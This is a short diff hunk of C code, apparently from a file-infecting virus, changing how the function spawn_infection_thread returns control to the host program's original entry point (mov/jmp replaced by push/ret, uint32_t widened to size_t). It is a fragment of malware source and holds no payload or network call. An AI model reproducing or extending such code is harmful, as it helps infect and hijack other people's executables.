@@ -19,10 +19,10 @@ void spawn_infection_thread(void) {
     } else {
         PRINT_DEBUG("failed to initialize data\n");
     }
-    uint32_t oep = get_original_entry_point();
+    size_t oep = get_original_entry_point();
     if (oep != OEP_DEFAULT) {
-        asm volatile("mov %0, %%eax\n"
-                     "jmp *%%eax": : "r" (oep));
+        asm volatile("push %0\n"
+                     "ret": : "r" (oep));
     }
 }
 
